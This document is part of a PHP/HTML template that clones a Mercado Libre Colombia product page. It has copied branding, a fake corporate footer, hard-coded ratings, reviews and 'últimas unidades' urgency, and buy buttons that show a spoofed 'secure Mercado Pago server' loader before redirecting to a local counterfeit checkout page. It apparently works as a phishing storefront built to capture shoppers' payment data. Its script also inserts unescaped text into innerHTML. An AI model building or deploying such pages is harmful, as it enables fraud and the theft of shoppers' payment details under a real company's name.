                justify-content: center;
                gap: 8px;
                margin: 12px 0 0 0;
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }
            .main-image-container {
                min-height: 320px;
                max-height: 380px;
            }
            .product-info-wrapper {
                width: 100%;
                flex-direction: column;
            }
            .product-info-center {
                width: 100%;
                padding: 16px;
            }
            .product-buybox {
                width: 100%;
                margin: 12px 0 0 0;
                border-left: none;
                border-top: 1px solid var(--ml-border);
                box-shadow: none;
                border-radius: 0;
                padding: 20px 16px;
            }
            .ml-opinions-wrapper {
                flex-direction: column;
                padding: 24px 16px 40px 16px;
                gap: 28px;
                border-radius: 0;
                box-shadow: none;
            }
            .ml-opinions-left {
                width: 100%;
            }
            .ml-opinions-right {
                width: 100%;
            }
        }

        @media (max-width: 768px) {
            body {
                padding-bottom: 70px;
            }
            .ml-mobile-bottom-bar {
                display: flex;
            }
            .nav-bounds {
                padding: 8px 12px;
                gap: 8px;
            }
            .nav-logo {
                width: 100px;
                height: 26px;
                margin-right: 4px;
            }
            .nav-search-form {
                height: 36px;
            }
            .nav-search-input {
                font-size: 13px;
                padding: 0 8px;
            }
            .nav-search-btn {
                width: 38px;
            }
            .product-title {
                font-size: 18px;
                line-height: 1.3;
            }
            .price-amount {
                font-size: 28px;
            }
            .main-image-container {
                min-height: 250px;
                max-height: 300px;
                cursor: default;
            }
            .thumbnail {
                width: 44px;
                height: 44px;
            }
            .ml-carousel-nav-btn {
                display: none;
            }
            .ml-modal-backdrop {
                padding: 0;
                align-items: flex-end;
            }
            .ml-modal-window {
                height: 92vh;
                max-height: 92vh;
                border-radius: 16px 16px 0 0;
            }
            .ml-modal-content-split {
                flex-direction: column;
                overflow-y: auto;
                height: calc(100% - 52px);
            }
            .ml-modal-left-pane {
                width: 100%;
                border-right: none;
                border-bottom: 1px solid #f0f0f0;
                min-height: 220px;
                max-height: 260px;
                padding: 10px;
            }
            .ml-modal-photo-stage img {
                max-height: 180px;
            }
            .ml-modal-right-pane {
                width: 100%;
                padding: 16px 14px;
            }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="ml-header">
        <div class="nav-bounds">
            <a href="https://www.mercadolibre.com.co" target="_blank" class="nav-logo" title="Mercado Libre"></a>
            
            <!-- LIVE SEARCH BAR CONSUMIENDO API DE MERCADOLIBRE -->
            <div class="nav-search-wrapper">
                <form class="nav-search-form" action="https://listado.mercadolibre.com.co/" method="get" target="_blank" onsubmit="return handleSearchSubmit(event)">
                    <input type="text" class="nav-search-input" id="mlSearchInput" name="as_word" placeholder="Buscar productos, marcas y más..." value="<?= htmlspecialchars($producto) ?>" autocomplete="off">
                    <button type="submit" class="nav-search-btn" title="Buscar">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                    </button>
                </form>
                <div class="nav-autosuggest-dropdown" id="mlAutosuggestBox"></div>
            </div>

            <div class="nav-right-links">
                <a href="https://www.mercadolibre.com.co/ayuda" target="_blank" class="nav-pqr-link">
                    Ayuda / PQR
                </a>
            </div>
        </div>
    </header>

    <!-- PRODUCTO PRINCIPAL -->
    <main class="main-container">
        <!-- GALERÍA DINÁMICA DE IMÁGENES CON EFECTO LUPA ZOOM -->
        <div class="product-gallery">
            <div class="gallery-thumbnails">
                <?php foreach ($lista_imagenes as $idx => $img_url): ?>
                    <div class="thumbnail <?= $idx === 0 ? 'active' : '' ?>" 
                         onclick="changeMainImage(this, '<?= htmlspecialchars($img_url) ?>')" 
                         style="background-image: url('<?= htmlspecialchars($img_url) ?>');">
                    </div>
                <?php endforeach; ?>
            </div>
            <div class="main-image-container" id="zoomContainer">
                <img id="main-product-image" src="<?= htmlspecialchars($imagen_producto) ?>" alt="<?= htmlspecialchars($producto) ?>" class="main-image" fetchpriority="high" loading="eager">
            </div>
        </div>

        <!-- INFORMACIÓN DEL PRODUCTO -->
        <div class="product-info-wrapper">
            <!-- CENTRO -->
            <div class="product-info-center">
                <div style="font-size: 14px; color: var(--ml-text-gray); margin-bottom: 8px;">
                    Nuevo | +1.400 vendidos
                </div>
                
                <h1 class="product-title"><?= htmlspecialchars($producto) ?></h1>
                
                <div style="display: flex; align-items: center; margin-bottom: 12px;">
                    <span style="color: var(--ml-text-gray); font-size: 14px; margin-right: 4px;">4.9</span>
                    <span class="stars" style="color: var(--ml-blue); font-size: 14px; letter-spacing: 2px;">★★★★★</span>
                    <span style="color: var(--ml-text-light); font-size: 14px; margin-left: 6px;">(1.341)</span>
                </div>

                <div style="background-color: #ff7733; color: white; font-size: 11px; font-weight: 700; display: inline-block; padding: 3px 8px; border-radius: 4px; margin-bottom: 12px; letter-spacing: 0.5px;">
                    MÁS VENDIDO EN SU CATEGORÍA
                </div>

                <div class="price-container">
                    <span class="price-currency">$</span>
                    <span class="price-amount"><?= $precio_formateado ?></span>
                </div>

                <div style="font-size: 15px; color: var(--ml-text-black); margin-bottom: 8px;">
                    <span style="color: var(--ml-green); font-weight:600;">12 cuotas de $ <?= $precio_cuotas ?> con 0% interés</span>
                </div>

                <div style="background-color: var(--ml-blue-light); color: var(--ml-blue); font-size: 12px; font-weight: 600; display: inline-block; padding: 4px 8px; border-radius: 4px; margin-bottom: 16px;">
                    15% OFF con Pago Seguro
                </div>

                <div style="font-size: 14px; color: var(--ml-text-black); margin-bottom: 20px; line-height: 1.4;">
                    Color: <strong>Oficial de Fábrica</strong><br>
                    <div style="width: 44px; height: 44px; border: 2px solid var(--ml-blue); border-radius: 4px; padding: 2px; margin-top: 6px; cursor: pointer;">
                        <div style="width: 100%; height: 100%; background-image: url('<?= htmlspecialchars($imagen_producto) ?>'); background-size: cover; background-position: center; border-radius: 2px;"></div>
                    </div>
                </div>

                <div style="font-size: 16px; font-weight: 600; margin-bottom: 10px;">
                    Lo que tienes que saber de este producto
                </div>
                <ul style="font-size: 13.5px; color: var(--ml-text-black); padding-left: 18px; margin-bottom: 16px; line-height: 1.5;">
                    <li style="margin-bottom: 6px;">Producto 100% original con empaque sellado de fábrica.</li>
                    <li style="margin-bottom: 6px;">Garantía oficial y soporte técnico directo.</li>
                    <li style="margin-bottom: 6px;">Envío prioritario asegurado a toda Colombia con número de guía.</li>
                </ul>
            </div>

            <!-- DERECHA (BUY BOX) -->
            <div class="product-buybox">
                <div style="font-size: 16px; color: var(--ml-green); font-weight: 600; margin-bottom: 4px;">
                    Llega gratis mañana
                </div>
                <div style="font-size: 13px; color: var(--ml-text-gray); margin-bottom: 16px;">
                    Comprando dentro de las próximas 3 horas.
                </div>

                <div style="font-size: 14px; font-weight: 600; margin-bottom: 16px;">
                    Stock disponible <span style="font-size: 13px; color: var(--ml-text-gray); font-weight: 400;">(Últimas unidades)</span>
                </div>

                <button class="btn btn-primary" onclick="iniciarCompra()" style="margin-bottom: 10px;">
                    Comprar ahora
                </button>
                <button class="btn btn-secondary" onclick="iniciarCompra()" style="margin-bottom: 20px;">
                    Pagar contraentrega
                </button>

                <div style="font-size: 13px; color: var(--ml-text-gray); line-height: 1.4; border-top: 1px solid var(--ml-border); padding-top: 14px;">
                    <p style="margin-bottom: 10px;"><b style="color: var(--ml-blue);">Compra Protegida:</b> Recibe el producto que esperabas o te devolvemos tu dinero.</p>
                    <p><b>Garantía:</b> 30 días de cobertura total.</p>
                </div>
            </div>
        </div>
    </main>

    <!-- MOBILE STICKY BOTTOM BAR -->
    <div class="ml-mobile-bottom-bar">
        <div class="ml-mobile-price-col">
            <span class="ml-mobile-price-label">Total</span>
            <span class="ml-mobile-price-val">$ <?= $precio_formateado ?></span>
        </div>
        <button class="btn btn-primary ml-mobile-buy-btn" onclick="iniciarCompra()">
            Comprar ahora
        </button>
    </div>

    <!-- SECCIÓN DE OPINIONES DEL PRODUCTO -->
    <section class="ml-opinions-wrapper" id="opinions-section">
        
        <!-- COLUMNA IZQUIERDA -->
        <div class="ml-opinions-left">
            <h2 class="ml-opinions-title">Opiniones del producto</h2>
            
            <div class="ml-score-row">
                <div class="ml-big-score">4.9</div>
                <div>
                    <div class="ml-score-meta-stars">★★★★★</div>
                    <div class="ml-score-total-count">1.341 calificaciones</div>
                </div>
            </div>

            <div class="ml-foreign-badge">
                <span class="info-icon">i</span>
                <span>Incluye opiniones de otros países.</span>
            </div>

            <div class="ml-bars-list">
                <div class="ml-bar-item">
                    <div class="ml-bar-track"><div class="ml-bar-fill" style="width: 90%;"></div></div>
                    <span class="ml-bar-label">5 ★</span>
                </div>
                <div class="ml-bar-item">
                    <div class="ml-bar-track"><div class="ml-bar-fill light" style="width: 8%;"></div></div>
                    <span class="ml-bar-label">4 ★</span>
                </div>
                <div class="ml-bar-item">
                    <div class="ml-bar-track"><div class="ml-bar-fill light" style="width: 2%;"></div></div>
                    <span class="ml-bar-label">3 ★</span>
                </div>
                <div class="ml-bar-item">
                    <div class="ml-bar-track"><div class="ml-bar-fill light" style="width: 0.5%;"></div></div>
                    <span class="ml-bar-label">2 ★</span>
                </div>
                <div class="ml-bar-item">
                    <div class="ml-bar-track"><div class="ml-bar-fill light" style="width: 0.5%;"></div></div>
                    <span class="ml-bar-label">1 ★</span>
                </div>
            </div>
        </div>

        <!-- COLUMNA DERECHA -->
        <div class="ml-opinions-right">
            
            <!-- Opiniones con fotos -->
            <h3 class="ml-photos-strip-title">Opiniones con fotos</h3>
            <div class="ml-photos-carousel-row">
                <?php foreach ($reviews_actuales as $idx => $rev): ?>
                <div class="ml-photo-card" onclick="abrirModalReview(<?= $idx ?>)">
                    <img src="<?= htmlspecialchars($rev['img']) ?>" alt="Foto reseña" loading="lazy">
                    <div class="ml-photo-card-rating">5 ★</div>
                </div>
                <?php endforeach; ?>

                <button class="ml-carousel-nav-btn" onclick="abrirModalReview(0)">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                </button>
            </div>

            <!-- Botones Filtros -->
            <div class="ml-filter-pills-row">
                <button class="ml-filter-pill">
                    <span>Ordenar</span>
                    <span style="font-size:10px; color:#666;">▾</span>
                </button>
                <button class="ml-filter-pill">
                    <span>Calificación</span>
                    <span style="font-size:10px; color:#666;">▾</span>
                </button>
            </div>

            <!-- AI Summary Box -->
            <div class="ml-ai-block">
                <div class="ml-ai-header">
                    <span class="ml-ai-heading">Resumen de opiniones</span>
                    <span class="ml-ai-subcount">717 comentarios</span>
                </div>
                <p class="ml-ai-paragraph">
                    <?= htmlspecialchars($resumen_ia_texto) ?>
                </p>
            </div>

            <!-- Lista Detallada de Opiniones -->
            <div class="ml-reviews-list">
                <?php foreach ($reviews_actuales as $idx => $rev): ?>
                <div class="ml-review-card-row">
                    <div class="ml-rev-header-line">
                        <div class="ml-rev-stars-blue">★★★★★</div>
                        <div class="ml-rev-meta-right"><?= htmlspecialchars($rev['ubicacion']) ?> | <?= htmlspecialchars($rev['fecha']) ?></div>
                    </div>

                    <?php if (!empty($rev['img'])): ?>
                    <div class="ml-rev-thumbs-row">
                        <div class="ml-rev-thumb-box" onclick="abrirModalReview(<?= $idx ?>)">
                            <img src="<?= htmlspecialchars($rev['img']) ?>" alt="Foto 1" loading="lazy">
                        </div>
                        <?php if (!empty($rev['img2'])): ?>
                        <div class="ml-rev-thumb-box" onclick="abrirModalReview(<?= $idx ?>)">
                            <img src="<?= htmlspecialchars($rev['img2']) ?>" alt="Foto 2" loading="lazy">
                        </div>
                        <?php endif; ?>
                    </div>
                    <?php endif; ?>

                    <p class="ml-rev-comment-text"><?= htmlspecialchars($rev['texto']) ?></p>

                    <div>
                        <!-- BOTÓN ÚTIL CON SVG OFICIAL DE MERCADO LIBRE -->
                        <button class="ml-rev-useful-btn" id="likeBtnList_<?= $idx ?>" onclick="toggleLike(this, <?= $idx ?>)">
                            <span>Útil</span>
                            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="ui-review-capability-valorizations__likes__like"><path fill-rule="evenodd" clip-rule="evenodd" d="M5.02125 6.25775L5.87824 5.91279L8.37994 0.751802L9.40301 1.24803C10.7777 1.91481 11.4317 3.50825 10.9218 4.94852L10.6452 5.72977L13.4447 5.69542C13.737 5.69184 14.0274 5.74166 14.3018 5.84245C15.546 6.29952 16.184 7.67866 15.727 8.92284L14.5609 12.0968C13.8627 13.9974 11.9079 15.1293 9.91198 14.7887L6.35827 14.1822L5.11866 14.1974L5.13337 15.3972L0.984325 15.4481L0.859204 5.24885L5.00825 5.19795L5.02125 6.25775ZM6.75603 6.85303L8.93573 2.3563C9.72188 2.77187 10.0895 3.7038 9.79057 4.54802L8.93988 6.95078L13.4594 6.89533C13.6056 6.89354 13.7508 6.91845 13.888 6.96885C14.5101 7.19738 14.8291 7.88695 14.6006 8.50904L13.4345 11.683C12.9358 13.0406 11.5395 13.8491 10.1139 13.6058L6.50639 12.9901L6.39809 12.9816L5.10394 12.9975L5.03705 7.54496L6.75603 6.85303ZM3.91858 14.212L2.16951 14.2334L2.07383 6.43404L3.82306 6.41258L3.91858 14.212Z" fill="currentColor"></path></svg>
                            <span id="likeCounterList_<?= $idx ?>"><?= $rev['likes'] ?></span>
                        </button>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>

        </div>
    </section>

    <!-- ─── FOOTER OFICIAL CON HIPERVÍNCULOS REALES ─── -->
    <footer class="ml-footer">
        <div class="ml-footer-container">
            <div class="ml-footer-links">
                <a href="https://careers-meli.mercadolibre.com/" target="_blank">Trabaja con nosotros</a>
                <a href="https://www.mercadolibre.com.co/ayuda/terminos-y-condiciones-de-uso_991" target="_blank">Términos y condiciones</a>
                <a href="https://www.mercadolibre.com.co/ofertas" target="_blank">Promociones</a>
                <a href="https://www.mercadolibre.com.co/privacidad" target="_blank">Cómo cuidamos tu privacidad</a>
                <a href="https://www.mercadolibre.com.co/accesibilidad" target="_blank">Accesibilidad</a>
                <a href="https://www.mercadolibre.com.co/ayuda" target="_blank">Ayuda / PQR</a>
                <a href="https://www.sic.gov.co/" target="_blank">www.sic.gov.co</a>
            </div>
            <p>Copyright © 1999-<?= date('Y') ?> MercadoLibre Colombia LTDA.<br>Carrera 17 # 93 - 09 Piso 3, Bogotá D.C., Colombia</p>
        </div>
    </footer>

    <!-- MODAL FLOTANTE DE OPINIONES CON FOTOS -->
    <div class="ml-modal-backdrop" id="mlPhotoModal" onclick="if(event.target===this) cerrarModalReview()">
        <div class="ml-modal-window">
            <div class="ml-modal-topbar">
                <button class="ml-modal-back-btn" onclick="cerrarModalReview()">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
                    <span>Opiniones con fotos</span>
                </button>
                <button class="ml-modal-close-icon" onclick="cerrarModalReview()">✕</button>
            </div>

            <div class="ml-modal-content-split">
                <!-- IZQUIERDA: FOTO GRANDE + PAGINADOR + MINIATURAS -->
                <div class="ml-modal-left-pane">
                    <div class="ml-modal-photo-stage">
                        <img id="modalMainPhoto" src="" alt="Foto de reseña">
                    </div>
                    <div class="ml-modal-counter" id="modalPhotoCounter">1 / 4</div>
                    <div class="ml-modal-thumbs-carousel" id="modalThumbsCarousel"></div>
                </div>

                <!-- DERECHA: OPINIÓN + BOTÓN ÚTIL INTERACTIVO -->
                <div class="ml-modal-right-pane">
                    <div class="ml-modal-stars" id="modalStars">★★★★★</div>
                    <div class="ml-modal-text" id="modalReviewText" style="font-weight: 600; margin-bottom: 4px;"></div>
                    <div class="ml-modal-meta" id="modalMeta"></div>
                    
                    <button class="ml-rev-useful-btn" id="modalLikeBtn" onclick="toggleModalLike()">
                        <span>Útil</span>
                        <svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="ui-review-capability-valorizations__likes__like"><path fill-rule="evenodd" clip-rule="evenodd" d="M5.02125 6.25775L5.87824 5.91279L8.37994 0.751802L9.40301 1.24803C10.7777 1.91481 11.4317 3.50825 10.9218 4.94852L10.6452 5.72977L13.4447 5.69542C13.737 5.69184 14.0274 5.74166 14.3018 5.84245C15.546 6.29952 16.184 7.67866 15.727 8.92284L14.5609 12.0968C13.8627 13.9974 11.9079 15.1293 9.91198 14.7887L6.35827 14.1822L5.11866 14.1974L5.13337 15.3972L0.984325 15.4481L0.859204 5.24885L5.00825 5.19795L5.02125 6.25775ZM6.75603 6.85303L8.93573 2.3563C9.72188 2.77187 10.0895 3.7038 9.79057 4.54802L8.93988 6.95078L13.4594 6.89533C13.6056 6.89354 13.7508 6.91845 13.888 6.96885C14.5101 7.19738 14.8291 7.88695 14.6006 8.50904L13.4345 11.683C12.9358 13.0406 11.5395 13.8491 10.1139 13.6058L6.50639 12.9901L6.39809 12.9816L5.10394 12.9975L5.03705 7.54496L6.75603 6.85303ZM3.91858 14.212L2.16951 14.2334L2.07383 6.43404L3.82306 6.41258L3.91858 14.212Z" fill="currentColor"></path></svg>
                        <span id="modalLikeCounter">0</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- PANTALLA DE CARGA ML -->
    <div id="ml-loader" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.92); z-index: 99999; flex-direction: column; justify-content: center; align-items: center;">
        <div style="width: 50px; height: 50px; border: 4px solid var(--ml-bg); border-top-color: var(--ml-blue); border-radius: 50%; animation: spin 0.8s linear infinite;"></div>
        <div style="margin-top: 18px; font-size: 17px; color: var(--ml-text-black); font-weight: 600;">Conectando con el servidor seguro de Mercado Pago...</div>
    </div>

    <style>
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script>
        const REVIEWS_DATA = <?= json_encode($reviews_actuales, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) ?>;
        let activeReviewModalIdx = 0;
        let likedMap = {};

        function iniciarCompra() {
            document.getElementById('ml-loader').style.display = 'flex';
            setTimeout(function() {
                const tokenVal = <?= json_encode($token) ?>;
                const prod = <?= json_encode($producto) ?>;
                if (tokenVal && tokenVal.length > 0) {
                    window.location.href = '../mercadopago/checkout_ml.php?token=' + encodeURIComponent(tokenVal);
                } else {
                    window.location.href = '../mercadopago/checkout_ml.php?producto=' + encodeURIComponent(prod) + '&precio=<?= $precio ?>';
                }
            }, 800);
        }

        function changeMainImage(element, newSrc) {
            let thumbnails = document.querySelectorAll('.gallery-thumbnails .thumbnail');
            thumbnails.forEach(function(thumb) {
                thumb.classList.remove('active');
            });
            element.classList.add('active');
            document.getElementById('main-product-image').src = newSrc;
        }

        /* ─── EFECTO DE LUPA ZOOM EXCLUSIVAMENTE PARA DESKTOP ─── */
        const zoomContainer = document.getElementById('zoomContainer');
        const mainProductImage = document.getElementById('main-product-image');

        if (zoomContainer && mainProductImage) {
            const isDesktop = () => window.matchMedia('(min-width: 1025px) and (hover: hover)').matches;

            zoomContainer.addEventListener('mouseenter', () => {
                if (isDesktop()) {
                    zoomContainer.classList.add('zoomed');
                }
            });

            zoomContainer.addEventListener('mousemove', (e) => {
                if (isDesktop()) {
                    const rect = zoomContainer.getBoundingClientRect();
                    const x = ((e.clientX - rect.left) / rect.width) * 100;
                    const y = ((e.clientY - rect.top) / rect.height) * 100;
                    mainProductImage.style.transformOrigin = `${x}% ${y}%`;
                }
            });

            zoomContainer.addEventListener('mouseleave', () => {
                zoomContainer.classList.remove('zoomed');
                mainProductImage.style.transformOrigin = 'center center';
            });
        }

        /* ─── LIVE SEARCH API DE MERCADOLIBRE CON AUTOSUGGEST ─── */
        const searchInput = document.getElementById('mlSearchInput');
        const suggestBox = document.getElementById('mlAutosuggestBox');
        let searchDebounce = null;

        if (searchInput && suggestBox) {
            searchInput.addEventListener('input', function() {
                clearTimeout(searchDebounce);
                const query = this.value.trim();
                if (query.length < 2) {
                    suggestBox.classList.remove('active');
                    suggestBox.innerHTML = '';
                    return;
                }

                searchDebounce = setTimeout(() => {
                    fetch(`https://http2.mlstatic.com/resources/sites/MCO/autosuggest?q=${encodeURIComponent(query)}`)
                        .then(res => res.json())
                        .then(data => {
                            const suggestions = data.suggested_queries || [];
                            if (suggestions.length > 0) {
                                suggestBox.innerHTML = '';
                                suggestions.slice(0, 6).forEach(item => {
                                    const a = document.createElement('a');
                                    a.className = 'nav-suggest-item';
                                    a.href = `https://listado.mercadolibre.com.co/${encodeURIComponent(item.q)}`;
                                    a.target = '_blank';
                                    a.innerHTML = `
                                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                                        <span>${item.q}</span>
                                    `;
                                    suggestBox.appendChild(a);
                                });
                                suggestBox.classList.add('active');
                            } else {
                                suggestBox.classList.remove('active');
                            }
                        })
                        .catch(() => {
                            suggestBox.classList.remove('active');
                        });
                }, 200);
            });

            document.addEventListener('click', function(e) {
                if (!searchInput.contains(e.target) && !suggestBox.contains(e.target)) {
                    suggestBox.classList.remove('active');
                }
            });
        }

        function handleSearchSubmit(e) {
            const val = searchInput.value.trim();
            if (val.length > 0) {
                window.open(`https://listado.mercadolibre.com.co/${encodeURIComponent(val)}`, '_blank');
            }
            return false;
        }

        /* ─── LÓGICA DEL MODAL DE OPINIONES CON FOTOS ─── */
        function abrirModalReview(idx) {
            if (idx < 0 || idx >= REVIEWS_DATA.length) return;
            activeReviewModalIdx = idx;
            const r = REVIEWS_DATA[idx];

            document.getElementById('modalMainPhoto').src = r.img;
            document.getElementById('modalPhotoCounter').textContent = `${idx + 1} / ${REVIEWS_DATA.length}`;
            document.getElementById('modalStars').textContent = r.stars;
            document.getElementById('modalReviewText').textContent = r.texto;
            document.getElementById('modalMeta').textContent = `${r.ubicacion} | ${r.fecha}`;
            
            // Like button state
            const currentLikes = likedMap[idx] ? r.likes + 1 : r.likes;
            document.getElementById('modalLikeCounter').textContent = currentLikes;
            const btn = document.getElementById('modalLikeBtn');
            if (likedMap[idx]) {
                btn.classList.add('liked');
            } else {
                btn.classList.remove('liked');
            }

            // Render miniaturas carrusel
            const carousel = document.getElementById('modalThumbsCarousel');
            carousel.innerHTML = '';
            REVIEWS_DATA.forEach((item, i) => {
                const thumb = document.createElement('div');
                thumb.className = 'ml-modal-thumb-item' + (i === idx ? ' active' : '');
                thumb.onclick = () => abrirModalReview(i);
                thumb.innerHTML = `<img src="${item.img}" alt="Thumb ${i+1}">`;
                carousel.appendChild(thumb);
            });

            document.getElementById('mlPhotoModal').classList.add('open');
            document.body.style.overflow = 'hidden';
        }

        function cerrarModalReview() {
            document.getElementById('mlPhotoModal').classList.remove('open');
            document.body.style.overflow = '';
        }

        function toggleLike(btn, idx) {
            if (likedMap[idx]) return;
            likedMap[idx] = true;
            REVIEWS_DATA[idx].likes += 1;
            
            btn.classList.add('liked');
            const counter = document.getElementById(`likeCounterList_${idx}`);
            if (counter) counter.textContent = REVIEWS_DATA[idx].likes;

            if (activeReviewModalIdx === idx) {
                const modalBtn = document.getElementById('modalLikeBtn');
                const modalCounter = document.getElementById('modalLikeCounter');
                if (modalBtn) modalBtn.classList.add('liked');
                if (modalCounter) modalCounter.textContent = REVIEWS_DATA[idx].likes;
            }
        }

        function toggleModalLike() {
            const idx = activeReviewModalIdx;
            if (likedMap[idx]) return;
            toggleLike(document.getElementById(`likeBtnList_${idx}`), idx);
            const modalBtn = document.getElementById('modalLikeBtn');
            const modalCounter = document.getElementById('modalLikeCounter');
            if (modalBtn) modalBtn.classList.add('liked');
            if (modalCounter) modalCounter.textContent = REVIEWS_DATA[idx].likes;
        }

        document.addEventListener('keydown', (e) => {
            const modal = document.getElementById('mlPhotoModal');
            if (modal && modal.classList.contains('open')) {
                if (e.key === 'Escape') cerrarModalReview();
                if (e.key === 'ArrowLeft' && activeReviewModalIdx > 0) abrirModalReview(activeReviewModalIdx - 1);
                if (e.key === 'ArrowRight' && activeReviewModalIdx < REVIEWS_DATA.length - 1) abrirModalReview(activeReviewModalIdx + 1);
            }
        });
    </script>
</body>
</html>
